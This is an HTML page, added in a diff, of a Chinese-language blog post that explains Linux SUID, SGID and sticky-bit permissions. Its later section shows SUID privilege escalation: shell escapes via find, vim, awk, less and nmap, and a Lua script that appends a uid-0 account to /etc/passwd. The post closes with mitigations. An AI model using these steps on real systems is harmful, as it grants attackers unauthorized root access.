@@ -1,0 +1,782 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/images/dandan.png">
+  <link rel="icon" href="/images/dandan.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Encounter">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="在使用Linux服务器时，偶然发现有些可执行文件有一些除了rwx权限之外的权限s，之前了解过有一些特殊的文件权限，是使用chattr设置，lsattr查看的一些特殊文件属性（详见文件管理），但是这种s权限不在隐藏属性中，于是好奇心驱使下特地研究一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux中的SUID、SGID、SBIT权限介绍">
+<meta property="og:url" content="https://chujian521.github.io/blog/2022/11/19/Linux%E4%B8%AD%E7%9A%84SUID%E3%80%81SGID%E3%80%81SBIT%E6%9D%83%E9%99%90%E4%BB%8B%E7%BB%8D/index.html">
+<meta property="og:site_name" content="X&#39;s blog">
+<meta property="og:description" content="在使用Linux服务器时，偶然发现有些可执行文件有一些除了rwx权限之外的权限s，之前了解过有一些特殊的文件权限，是使用chattr设置，lsattr查看的一些特殊文件属性（详见文件管理），但是这种s权限不在隐藏属性中，于是好奇心驱使下特地研究一下。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-11-19T13:01:27.000Z">
+<meta property="article:modified_time" content="2022-11-20T11:06:26.317Z">
+<meta property="article:author" content="Encounter">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Linux中的SUID、SGID、SBIT权限介绍 - X&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chujian521.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"88d6a072634686f804175a1f3d287260","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?88d6a072634686f804175a1f3d287260";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>X&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Linux中的SUID、SGID、SBIT权限介绍"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-19 21:01" pubdate>
+          2022年11月19日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          49 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Linux中的SUID、SGID、SBIT权限介绍</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>在使用Linux服务器时，偶然发现有些可执行文件有一些除了rwx权限之外的权限s，之前了解过有一些特殊的文件权限，是使用chattr设置，lsattr查看的一些特殊文件属性（详见<a href="https://chujian521.github.io/blog/2020/09/03/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86-1">文件管理</a>），但是这种s权限不在隐藏属性中，于是好奇心驱使下特地研究一下。</strong></p>
+<p><a href="images/fj60.jpg"></a></p>
+<span id="more"></span>
+
+<h2 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h2><h3 id="什么是SUID权限"><a href="#什么是SUID权限" class="headerlink" title="什么是SUID权限"></a>什么是SUID权限</h3><p>SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义。</p>
+<p>在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。通俗的来讲，假设我们现在有一个可执行文件<code>ls</code>，其属主为root,当我们通过非root用户登录时，如果<code>ls</code>设置了SUID权限,我们可在非root用户下运行该二进制可执行文件，在执行文件时，该进程的权限将为root权限。</p>
+<h3 id="使用SUID权限的实例"><a href="#使用SUID权限的实例" class="headerlink" title="使用SUID权限的实例"></a>使用SUID权限的实例</h3><p>比如su命令和passwd命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:/bin$ <span class="hljs-built_in">ls</span> -l su<br>-rwsr-xr-x 1 root root 44664 Mar 14  2022 su<br>x@iZf8zdt0lxjb33kqwiaft8Z:/bin$ <span class="hljs-built_in">ls</span> -l /usr/bin/passwd<br>-rwsr-xr-x 1 root root 59640 Mar 14  2022 /usr/bin/passwd<br></code></pre></td></tr></table></figure>
+
+<p>实际上这2个可执行文件的所有者是root，但是我们依然可以在普通账号下使用这两个命令，这是因为普通账号在使用这2个命令的时候会暂时获得其拥有者的权限。</p>
+<h3 id="如何设置SUID权限"><a href="#如何设置SUID权限" class="headerlink" title="如何设置SUID权限"></a>如何设置SUID权限</h3><p>使用<code>chmod u+s 可执行文件</code>设置可执行文件的SUID权限，对于不可执行文件设置SUID权限是无效的，相应的位置上列出属性后是S，如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">chmod</span> u+s run <br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ ll<br>-rwSrw-r-- 1 x    x       0 Nov 19 21:35 run<br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">chmod</span> +x run <br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ ll<br>-rwsrwxr-x 1 x    x       0 Nov 19 21:35 run*<br></code></pre></td></tr></table></figure>
+
+<p>也可以使用数字表示：SUID&#x3D;4，SGID&#x3D;2，SBIT&#x3D;1，将原来的三位数扩展为四位数即可，把它们放在权限数字的最开头。只设置SUID可以用<code>chmod 4664 run</code></p>
+<h2 id="SGID权限"><a href="#SGID权限" class="headerlink" title="SGID权限"></a>SGID权限</h2><h3 id="什么是SGID权限"><a href="#什么是SGID权限" class="headerlink" title="什么是SGID权限"></a>什么是SGID权限</h3><p>当s出现在文件的所属组x权限位置上时，表示所属组有SGID的权限。它有如下特点：</p>
+<ol>
+<li>既可以作用于目录，也可以作用于可执行文件</li>
+<li>只要父目录有SGID权限，所有的子目录都会递归继承</li>
+<li>执行者对于该可执行文件需要具有x权限</li>
+<li>在执行过程中，调用者会暂时获得该文件的所属组权限</li>
+</ol>
+<h3 id="如何设置SGID权限"><a href="#如何设置SGID权限" class="headerlink" title="如何设置SGID权限"></a>如何设置SGID权限</h3><p>与SUID的设置类似，但是SGID可以设置目录和可执行文件，使用<code>chmod g+s 可执行文件or目录</code>即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">chmod</span> g+s run <br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ ll<br>-rwsrwsr-x 1 x    x       0 Nov 19 21:35 run*<br></code></pre></td></tr></table></figure>
+
+<p>也可以使用上述介绍SUID时的数字标识设置。</p>
+<h2 id="SBIT权限"><a href="#SBIT权限" class="headerlink" title="SBIT权限"></a>SBIT权限</h2><h3 id="什么是SBIT权限"><a href="#什么是SBIT权限" class="headerlink" title="什么是SBIT权限"></a>什么是SBIT权限</h3><p>当t出现在其他组的x权限位置时，表示其他组具有SBIT的权限。</p>
+<p>SBIT（Sticky Bit）目前只针对目录有效，对于目录的作用是：当用户在该目录下建立文件或目录时，仅有自己与 root才有权力删除。</p>
+<h3 id="使用SBIT权限的实例"><a href="#使用SBIT权限的实例" class="headerlink" title="使用SBIT权限的实例"></a>使用SBIT权限的实例</h3><p>比如&#x2F;tmp目录，任何人都可以在&#x2F;tmp内增加、修改文件（因为权限全是rwx），但仅有该文件&#x2F;目录建立者与 root能够删除自己的目录或文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">cd</span> /<br>x@iZf8zdt0lxjb33kqwiaft8Z:/$ ll <br>drwxrwxrwt  10 root root  4096 Nov 19 21:58 tmp/<br></code></pre></td></tr></table></figure>
+
+<h3 id="如何设置SBIT权限"><a href="#如何设置SBIT权限" class="headerlink" title="如何设置SBIT权限"></a>如何设置SBIT权限</h3><p>SBIT权限只能设置到目录，使用<code>chmod o+t 目录</code>，或者使用数字标识设置。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">mkdir</span> tmp<br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ ll<br>drwxrwxr-x 2 x    x    4096 Nov 19 22:34 tmp/<br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">chmod</span> 1777 tmp/<br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ ll<br>total 24<br>drwxrwxrwt 2 x    x    4096 Nov 19 22:34 tmp/<br></code></pre></td></tr></table></figure>
+
+<p>权限t也有大小写之分，大写说明没有x权限，小写说明有x权限。</p>
+<h2 id="利用SUID提权（新版Linux做了防护）"><a href="#利用SUID提权（新版Linux做了防护）" class="headerlink" title="利用SUID提权（新版Linux做了防护）"></a>利用SUID提权（新版Linux做了防护）</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>通过前面的SUID权限的介绍可以知道，在执行属于root的拥有suid权限的可执行文件时，我们执行的可执行文件会拥有root权限，因此我们可以利用这一点，利用具有suid权限用户的命令去执行我们想要执行的命令。</p>
+<h3 id="可执行命令的一些命令"><a href="#可执行命令的一些命令" class="headerlink" title="可执行命令的一些命令"></a>可执行命令的一些命令</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>适用版本：2.02-5.21</p>
+<p>在早期nmap版本中，带有交互模式，因而允许用户执行shell命令，可以使用如下命令进入交互模式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --interactive<br>nmap&gt; !sh<br></code></pre></td></tr></table></figure>
+
+<p>–interactive应该是比较老版本的nmap提供的选项，最近的nmap上都没有这个选项了，不过可以写一个nse脚本，内容为<code>os.execute(&#39;/bin/sh&#39;)</code>，然后<code>nmap --script=shell.nse</code>来提权</p>
+<h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>find用来在系统中查找文件，比较常用，有执行命令的能力。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">find anyExistFile -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br><span class="hljs-comment">#进入shell</span><br>find anyExistFile -<span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> \;<br>$<br></code></pre></td></tr></table></figure>
+
+<h4 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h4><p>vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。</p>
+<p>通过vim进入shell：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">vim<br><span class="hljs-comment">#vim命令</span><br>:<span class="hljs-built_in">set</span> <span class="hljs-built_in">shell</span> = <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>:<span class="hljs-built_in">shell</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="less-amp-more"><a href="#less-amp-more" class="headerlink" title="less&amp;more"></a>less&amp;more</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在less或者more中输入:</span><br>!/bin/sh<br></code></pre></td></tr></table></figure>
+
+<p>即可进入shell</p>
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><p>awk是一种强大的文本处理工具，它也可以进入shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="提权实例（失败）"><a href="#提权实例（失败）" class="headerlink" title="提权实例（失败）"></a>提权实例（失败）</h3><h4 id="寻找可利用的具有SUID权限的的文件"><a href="#寻找可利用的具有SUID权限的的文件" class="headerlink" title="寻找可利用的具有SUID权限的的文件"></a>寻找可利用的具有SUID权限的的文件</h4><p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从&#x2F;目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到&#x2F;dev&#x2F;null，从而仅列出该用户具有访问权限的那些二进制文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; ;<br></code></pre></td></tr></table></figure>
+
+<p>例子：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>/usr/bin/passwd<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/usr/bin/sudo<br>/usr/bin/chfn<br>/usr/bin/staprun<br>/usr/bin/find<br>/usr/bin/chsh<br>/usr/bin/traceroute6.iputils<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/bin/umount<br>/bin/su<br>/bin/mount<br>/bin/ping<br>/bin/fusermount<br></code></pre></td></tr></table></figure>
+
+<p>我们发现find具有SUID权限，因此后面可以进行利用（这里是特地设置的例子）。</p>
+<h4 id="利用find进入shell"><a href="#利用find进入shell" class="headerlink" title="利用find进入shell"></a>利用find进入shell</h4><p>亲测Ubuntu18.04不可以，进入shell之后权限还是原始的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:/home/root$ <span class="hljs-built_in">cd</span> /tmp/<br>x@iZf8zdt0lxjb33kqwiaft8Z:/tmp$ <span class="hljs-built_in">touch</span> 111<br>x@iZf8zdt0lxjb33kqwiaft8Z:/tmp$ find 111 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> \;<br>$ <span class="hljs-built_in">id</span><br>uid=1000(x) gid=1000(x) <span class="hljs-built_in">groups</span>=1000(x)<br></code></pre></td></tr></table></figure>
+
+<p>查询资料得知如果启动bash时的Effective UID与Real UID不相同，而且没有使用-p参数，则bash会将Effective UID还原成Real UID。据说Ubuntu16.04之后都做了相关防护，在dash代码中添加了以下函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">setprivileged</span><span class="hljs-params">(<span class="hljs-type">int</span> on)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> is_privileged = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (is_privileged == on)<br>        <span class="hljs-keyword">return</span>;<br><br>    is_privileged = on;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * To limit bogus system(3) or popen(3) calls in setuid binaries, require</span><br><span class="hljs-comment">     * -p flag to work in this situation.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (!on &amp;&amp; (uid != geteuid() || gid != getegid())) &#123;<br>        setuid(uid);<br>        setgid(gid);<br>        <span class="hljs-comment">/* PS1 might need to be changed accordingly. */</span><br>        choose_ps1();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>目前各大发行版的sh都增加了这个限制，一旦拥有suid的程序存在命令注入漏洞或其本身存在执行命令的功能，那么就有本地提权的风险，如果在sh中增加这个限制，提权的隐患就能被极大地遏制。</p>
+<h3 id="使用nmap脚本创建新用户测试（成功）"><a href="#使用nmap脚本创建新用户测试（成功）" class="headerlink" title="使用nmap脚本创建新用户测试（成功）"></a>使用nmap脚本创建新用户测试（成功）</h3><p>因为nmap script中使用的是lua语言，而lua库中似乎没有直接启动进程的方式，都会依赖系统shell，所以我们可能并不能直接通过执行shell的方式来提权。但是因为此时nmap已经是root权限，我们可以通过修改<code>/etc/passwd</code>的方式来添加一个新的super user</p>
+<p>使用openssl将命令生成加密密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iZf8zdt0lxjb33kqwiaft8Z:~<span class="hljs-comment"># openssl passwd -1 -salt root2 pass123</span><br>$1$root2<span class="hljs-variable">$q24xYX7T6HxzG7tEjVEKO</span>.<br></code></pre></td></tr></table></figure>
+
+<p>nmap脚本：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> file = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>file:<span class="hljs-built_in">write</span>(<span class="hljs-string">&quot;root2:$1$root2$q24xYX7T6HxzG7tEjVEKO.:0:0::/root:/bin/bash\n&quot;</span>)<br>file:<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure>
+
+<p>成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ nmap --script=file.nse<br><br>Starting Nmap 7.60 ( https://nmap.org ) at 2022-11-20 18:29 CST<br>WARNING: Running Nmap setuid, as you are doing, is a major security risk.<br><br>NSE: failed to initialize the script engine:<br>/usr/bin/../share/nmap/nse_main.lua:626: file.nse is missing required field: <span class="hljs-string">&#x27;action&#x27;</span><br>stack traceback:<br>        [C]: <span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        /usr/bin/../share/nmap/nse_main.lua:626: <span class="hljs-keyword">in</span> field <span class="hljs-string">&#x27;new&#x27;</span><br>        /usr/bin/../share/nmap/nse_main.lua:825: <span class="hljs-keyword">in</span> <span class="hljs-built_in">local</span> <span class="hljs-string">&#x27;get_chosen_scripts&#x27;</span><br>        /usr/bin/../share/nmap/nse_main.lua:1312: <span class="hljs-keyword">in</span> main chunk<br>        [C]: <span class="hljs-keyword">in</span> ?<br><br>QUITTING!<br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ su root2<br>Password:<br>root@iZf8zdt0lxjb33kqwiaft8Z:/home/x<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><p>管理员要仔细研究具有SUID权限的文件，不要给易被利用的文件（比如上述的一些命令等）以SUID权限，防止SUID的滥用导致攻击者在进入服务器时轻易获取root权限。及时更新新版系统补丁。</p>
+<p>Linux 2.2以后增加了capabilities的概念，可以理解为水平权限的分离。以往如果需要某个程序的某个功能需要特权，我们就只能使用root来执行或者给其增加SUID权限，一旦这样，我们等于赋予了这个程序所有的特权，这是不满足权限最小化的要求的；在引入capabilities后，root的权限被分隔成很多子权限，这就避免了滥用特权的问题，我们可以在<a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities(7) - Linux manual page</a>中看到这些特权的说明。</p>
+<p>比如我们可以给nmap添加类似的能力即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">setcap</span> cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap<br>nmap --privileged -sS 192.168.1.1<br></code></pre></td></tr></table></figure>
+
+<p>这样就可以不使用SUID权限即可拥有相关的能力。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Linux中的SUID、SGID、SBIT权限介绍</div>
+      <div>https://chujian521.github.io/blog/2022/11/19/Linux中的SUID、SGID、SBIT权限介绍/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Encounter</div>
+        </div>
+      
+      
